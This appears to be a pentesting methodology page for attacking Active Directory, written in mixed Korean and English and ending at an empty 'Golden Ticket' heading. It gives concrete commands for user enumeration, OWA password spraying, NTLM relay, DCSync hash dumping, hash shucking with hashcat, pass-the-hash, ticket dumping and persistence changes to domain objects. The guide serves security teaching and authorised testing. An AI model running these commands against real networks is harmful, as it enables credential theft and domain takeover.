# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 기본 개요

**Active Directory**는 네트워크 관리자가 네트워크 내에서 **domains**, **users**, **objects**를 효율적으로 생성하고 관리할 수 있게 해주는 기반 기술입니다. 대규모 사용자를 관리 가능한 **groups** 및 하위 그룹으로 조직하고 다양한 수준에서 **access rights**를 제어하도록 설계되어 있습니다.

**Active Directory**의 구조는 주요 세 가지 계층으로 구성됩니다: **domains**, **trees**, 그리고 **forests**. **Domain**은 공통 데이터베이스를 공유하는 **users**나 **devices** 같은 객체들의 모음입니다. **Trees**는 이러한 도메인들이 공통 구조로 연결된 그룹이고, **forest**는 여러 트리가 **trust relationships**을 통해 서로 연결된 최상위 조직 구조를 의미합니다. 각 계층에서 특정한 **access**와 **communication rights**를 지정할 수 있습니다.

**Active Directory**의 핵심 개념은 다음과 같습니다:

1. **Directory** – Active Directory 객체와 관련된 모든 정보를 저장합니다.
2. **Object** – 디렉터리 내의 엔티티를 나타내며 **users**, **groups**, 또는 **shared folders** 등을 포함합니다.
3. **Domain** – 디렉터리 객체의 컨테이너 역할을 하며, 여러 도메인이 **forest** 내에서 공존할 수 있고 각 도메인은 자체 객체 모음을 유지합니다.
4. **Tree** – 공통 루트 도메인을 공유하는 도메인들의 그룹입니다.
5. **Forest** – Active Directory에서 조직 구조의 최상위로, 여러 **trees**와 그 사이의 **trust relationships**로 구성됩니다.

**Active Directory Domain Services (AD DS)**는 네트워크 내 중앙 관리와 통신에 중요한 다양한 서비스를 포함합니다. 이러한 서비스는 다음을 포함합니다:

1. **Domain Services** – 데이터를 중앙화하여 저장하고 **users**와 **domains** 간의 상호작용을 관리하며 **authentication** 및 **search** 기능을 제공합니다.
2. **Certificate Services** – 보안 **digital certificates**의 생성, 배포 및 관리를 담당합니다.
3. **Lightweight Directory Services** – **LDAP protocol**을 통해 디렉터리 기반 애플리케이션을 지원합니다.
4. **Directory Federation Services** – 여러 웹 애플리케이션에 대해 **single-sign-on** 기능을 제공하여 단일 세션으로 사용자를 인증합니다.
5. **Rights Management** – 저작권 자료의 무단 배포 및 사용을 규제하여 보호를 돕습니다.
6. **DNS Service** – **domain names** 해석에 필수적입니다.

자세한 설명은 다음을 확인하세요: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

- **Pentest the network:**
- Scan the network, find machines and open ports and try to **exploit vulnerabilities** or **extract credentials** from them (for example, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerating DNS could give information about key servers in the domain as web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Take a look to the General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) to find more information about how to do this.
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- A more detailed guide on how to enumerate a SMB server can be found here:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.
- If you find the complete names of company workers, you could try different AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). The most common conventions are: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicating that the user is required to perform pre-authentication.
- **No Authentication against MS-NRPC**: Using auth-level = 1 (No authentication) against the MS-NRPC (Netlogon) interface on domain controllers. The method calls the `DsrGetDcNameEx2` function after binding MS-NRPC interface to check if the user or computer exists without any credentials. The [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implements this type of enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

네트워크에서 이러한 서버를 발견한 경우 **user enumeration against it**도 수행할 수 있습니다. 예를 들어, [**MailSniper**](https://github.com/dafthack/MailSniper) 도구를 사용할 수 있습니다:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 사용자 이름 목록은 [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 및 이쪽 ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames))에서 찾을 수 있습니다.
>
> 하지만, 이 내용에 앞서 수행했어야 할 recon 단계에서 해당 회사에 근무하는 사람들의 **이름**을 확보했어야 합니다. 이름과 성을 알면 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 스크립트를 사용해 잠재적인 유효한 사용자 이름을 생성할 수 있습니다.

### 하나 이상의 사용자 이름을 알고 있는 경우

이미 유효한 사용자 이름은 알고 있지만 비밀번호는 모르는 경우, 다음을 시도하세요:

- [**ASREPRoast**](asreproast.md): 사용자가 _DONT_REQ_PREAUTH_ 속성을 **가지고 있지 않다면**, 해당 사용자에 대해 **AS_REP 메시지**를 요청할 수 있습니다. 이 메시지에는 사용자 비밀번호의 파생값으로 암호화된 일부 데이터가 포함됩니다.
- [**Password Spraying**](password-spraying.md): 발견한 각 사용자에 대해 가장 **일반적인 비밀번호들**을 시도해 보세요. 일부 사용자가 약한 비밀번호를 사용하고 있을 수 있습니다 (비밀번호 정책을 염두에 두세요!).
- 또한 사용자 메일 서버 접근을 위해 **OWA servers**를 대상으로 스프레이할 수도 있습니다.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

네트워크의 일부 프로토콜을 **poisoning**하기 위해 크랙할 수 있는 몇몇 챌린지 **hashes**를 **obtain**할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory를 열거하는 데 성공했다면 **더 많은 이메일과 네트워크에 대한 더 나은 이해**를 얻을 수 있습니다. AD 환경에 접근하기 위해 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)를 강제할 수 있을지도 모릅니다.

### NetExec workspace-driven recon & relay posture checks

- **`nxcdb` workspaces**를 사용해 engagement별 AD recon 상태를 유지하세요: `workspace create <name>`는 프로토콜별 SQLite DB들을 `~/.nxc/workspaces/<name>` 아래에 생성합니다 (smb/mssql/winrm/ldap/etc). `proto smb|mssql|winrm`로 뷰를 전환하고 `creds`로 수집된 시크릿을 나열하세요. 완료 후 민감한 데이터는 수동으로 삭제하세요: `rm -rf ~/.nxc/workspaces/<name>`.
- `netexec smb <cidr>`로 빠른 서브넷 탐색을 하면 **domain**, **OS build**, **SMB signing requirements**, 및 **Null Auth**를 확인할 수 있습니다. `(signing:False)`로 표시된 멤버는 **relay-prone**한 반면, DC는 종종 서명(signing)을 요구합니다.
- NetExec 출력에서 바로 **hostnames in /etc/hosts**를 생성해 타깃팅을 용이하게 하세요:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- When **SMB relay to the DC is blocked** by signing, 여전히 **LDAP** posture를 검사하세요: `netexec ldap <dc>`는 `(signing:None)` / weak channel binding을 강조합니다. SMB signing이 필요하지만 LDAP signing이 비활성화된 DC는 **relay-to-LDAP** 대상이 되어 **SPN-less RBCD** 같은 악용에 여전히 취약합니다.

### 클라이언트 측 프린터 credential leaks → bulk domain credential validation

- Printer/web UIs는 가끔 HTML에 **embed masked admin passwords in HTML**. View source/devtools로 평문이 드러날 수 있습니다(e.g., `<input value="<password>">`), 이를 통해 Basic-auth 접근으로 scan/print repositories에 접근할 수 있습니다.
- Retrieved print jobs에는 per-user passwords가 포함된 **plaintext onboarding docs**가 들어있을 수 있습니다. 테스트 시 페어링을 맞춰 유지하세요:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain userinto `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

이제 기본 자격증명이 확보되었으니 AD 내부에서 공유되는 **흥미로운 파일을 찾을 수 있는지** 확인해야 합니다. 수동으로 할 수는 있지만 매우 지루하고 반복적인 작업이며(수백 개의 문서를 확인해야 할 수도 있습니다) 시간이 많이 듭니다.

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

만약 **다른 PCs or shares에 접근할 수** 있다면, SCF file 같은 파일을 **배치(place files)**해서 누군가 그 파일에 접근했을 때 당신에게 대한 **NTLM authentication이 트리거(trigger)**되도록 만들고, 그래서 **NTLM challenge를 탈취(steal)**해 크랙할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

이 취약점은 인증된 사용자가 누구나 **domain controller를 손상(compromise)**시킬 수 있도록 허용했습니다.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**다음 기술들을 수행하려면 일반 도메인 사용자는 충분하지 않으며, 이러한 공격을 수행할 수 있는 특별한 권한/자격증명이 필요합니다.**

### Hash extraction

운이 좋다면 [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (리레이 포함), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) 등을 통해 일부 local admin 계정을 **탈취(compromise)**했을 것입니다.  
그 다음으로 메모리와 로컬에서 모든 hashes를 덤프할 차례입니다.  
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**사용자의 hash를 확보하면**, 그것을 사용해 해당 사용자로 **가장(impersonate)**할 수 있습니다.  
해당 **hash를 사용한 NTLM authentication을 수행(perform)**해줄 수 있는 **도구(tool)**를 사용하거나, 새 **sessionlogon**을 생성하고 그 **hash를 LSASS에 인젝션(inject)**하여 이후 이루어지는 모든 **NTLM authentication**에 그 **hash가 사용되도록** 할 수 있습니다. 후자 옵션이 mimikatz가 하는 방식입니다.  
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

이 공격은 일반적인 Pass The Hash over NTLM 프로토콜의 대안으로, **사용자의 NTLM hash를 사용해 Kerberos 티켓을 요청하는** 것을 목표로 합니다. 따라서 NTLM 프로토콜이 비활성화되어 있고 인증 프로토콜로 **Kerberos만 허용되는** 네트워크에서 특히 **유용**할 수 있습니다.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

만약 **local administrator의 hash** 또는 **password**를 가지고 있다면, 다른 **PCs**에 해당 자격증명으로 **로컬 로그인(login locally)**을 시도해보세요.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 이는 상당히 **노이즈가 많을 수 있으며** **LAPS**가 이를 **완화**할 수 있다는 점에 유의하세요.

### MSSQL Abuse & Trusted Links

사용자가 **MSSQL 인스턴스에 접근할 권한**이 있다면, 해당 MSSQL 호스트에서 (SA로 실행 중인 경우) **명령을 실행**하거나 NetNTLM **해시를 훔치거나** **relay** **공격**을 수행할 수 있습니다.\
또한 한 MSSQL 인스턴스가 다른 MSSQL 인스턴스에 의해 신뢰(trusted, database link)되는 경우, 사용자가 신뢰된 데이터베이스에 대한 권한이 있다면 **신뢰 관계를 이용해 다른 인스턴스에서도 쿼리를 실행할 수 있습니다**. 이러한 신뢰는 체인으로 연결될 수 있고, 결국 사용자가 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수도 있습니다.\
**데이터베이스 간의 링크는 포리스트 간의 트러스트에도 작동합니다.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

서드파티 인벤토리 및 배포 솔루션은 종종 자격증명 및 코드 실행으로 이어지는 강력한 경로를 노출합니다. 자세한 내용은 다음을 참조하세요:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 속성이 설정된 Computer 객체를 찾고 해당 컴퓨터에 대한 도메인 권한이 있다면, 해당 컴퓨터에 로그인하는 모든 사용자의 메모리에서 TGT를 덤프할 수 있습니다.\
따라서 **Domain Admin이 해당 컴퓨터에 로그인하면**, [Pass the Ticket](pass-the-ticket.md)를 사용해 그의 TGT를 덤프하고 가장할 수 있습니다.\
constrained delegation 덕분에 **Print Server를 자동으로 탈취**할 수도 있습니다(운이 좋으면 DC일 수 있음).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

사용자나 컴퓨터가 "Constrained Delegation"에 허용되어 있으면 특정 컴퓨터의 서비스에 대해 **임의의 사용자를 가장하여 접근할 수 있습니다**.\
따라서 이 사용자/컴퓨터의 **해시를 탈취**하면 (심지어 도메인 관리자도) 어떤 사용자로도 **가장하여 특정 서비스에 접근**할 수 있습니다.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

원격 컴퓨터의 Active Directory 객체에 대해 **WRITE** 권한을 가지면 **권한 상승**을 포함한 코드 실행을 달성할 수 있습니다:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

탈취한 사용자가 몇몇 도메인 객체에 대해 **흥미로운 권한**을 가지고 있을 수 있으며, 이는 나중에 **횡적 이동**이나 **권한 상승**을 가능하게 합니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

도메인 내에서 **Spool 서비스가 리스닝 중인 것을 발견**하면 이는 **새 자격증명을 획득**하고 **권한을 상승**시키는 데 **악용될 수 있습니다**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**다른 사용자들이** **탈취된** 머신에 **접속하는 경우**, 메모리에서 자격증명을 **수집**하거나 그들의 프로세스에 **beacon을 주입**하여 그들을 가장할 수 있습니다.\
대부분의 사용자는 RDP로 시스템에 접근하므로, 제3자 RDP 세션에 대해 수행할 수 있는 몇 가지 공격 방법은 다음과 같습니다:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**는 도메인에 조인된 컴퓨터의 **로컬 Administrator 비밀번호**를 관리하기 위한 시스템을 제공하며, 비밀번호가 **무작위화**되고 고유하며 자주 **변경**되도록 보장합니다. 이 비밀번호들은 Active Directory에 저장되며 액세스는 ACL을 통해 권한이 있는 사용자로 통제됩니다. 이러한 비밀번호에 접근할 수 있는 충분한 권한이 있다면 다른 컴퓨터로의 피벗이 가능해집니다.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

탈취한 머신에서 **인증서 수집**은 환경 내에서 권한을 상승시키는 방법이 될 수 있습니다:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**취약한 템플릿**이 구성되어 있으면 이를 악용하여 권한을 상승시킬 수 있습니다:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

한 번 **Domain Admin** 또는 더 나아가 **Enterprise Admin** 권한을 얻으면, 도메인 데이터베이스인 _ntds.dit_을 **덤프**할 수 있습니다.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

앞서 논의한 일부 기법은 영구성(persistence) 용도로도 사용할 수 있습니다.\
예를 들어 다음과 같은 작업을 할 수 있습니다:

- 사용자를 [**Kerberoast**](kerberoast.md)에 취약하게 만들기

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 사용자를 [**ASREPRoast**](asreproast.md)에 취약하게 만들기

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 사용자에게 [**DCSync**](#dcsync) 권한 부여

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**은 특정 서비스에 대한 **정상적인 TGS 티켓**을 생성하기 위해 **NTLM 해시**(예: PC 계정의 해시)를 사용하는 기법입니다. 이 방법은 해당 서비스의 권한에 접근하기 위해 사용됩니다.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

